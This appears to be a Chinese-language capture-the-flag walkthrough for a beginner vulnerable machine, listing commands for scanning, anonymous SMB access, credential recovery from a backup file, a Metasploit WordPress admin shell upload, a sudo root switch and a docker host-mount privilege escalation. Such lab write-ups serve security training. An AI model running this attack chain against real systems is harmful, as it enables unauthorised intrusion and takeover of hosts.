虚拟机简介：尝试读取用户和根目录中的flag

目标：2个flag

级别：初级

1、通过arp-scan检测主机IP地址

arp-scan -l
‍

2、通过nmap进行端口扫描

nmap -A -sS -sV -v -p- 192.168.1.6
查看开放21、22、80、139、445端口

3、WEB渗透测试

3.1 使用dirb进行扫描测试，查看有WordPress站点

dirb http://192.168.1.6

3.2 使用wpscan进行扫描，没有发现有用信息

wpscan --url http://192.168.1.6/wordpress

3.3 服务器开启了139和445端口，查看smb服务

enum4linux 192.168.1.6

使用smbclient进行连接，密码为空

smbclient -H //192.168.1.6/Anonymousget backup.zip

查看到有一个备份文件，下载查看

3.4 解压备份文件，在remember_me.txt得到用户名和密码

unzip backup.zip

3.5 访问WordPress页面，一直卡在状态，添加hosts

vim /etc/hosts

使用获取到的账号登录，发现可以登录成功

3.6 使用metasploit的WordPress模板

use exploit/unix/webapp/wp_admin_shell_uploadset rhosts 192.168.1.6set username adminset password MachineBoy141set targeturi /wordpressexploit

3.7 进入shell，并使用python优化脚本，查看/home目录文件

shellpython3 -c 'import pty;pty.spawn("/bin/bash")'

查看home目录中的kbadmin账号下有两个文件，user.txt中获取到flag，note.txt提示使用docker提权

cat /home/kbadmin/user.txtcat /home/kbadmin/note.txt

4、系统提权

4.1 切换kbadmin，密码同上面，为：MachineBoy141

su - kbadminsudo -l

4.2 sudo权限授予所有，直接切换到root账号，获得flag

sudo sucat /root/flag.txt

4.3 根据提示使用docker提权

docker run -it -v /:/mnt daocloud.io/library/ubuntucd /mnt/rootcat flag.txt
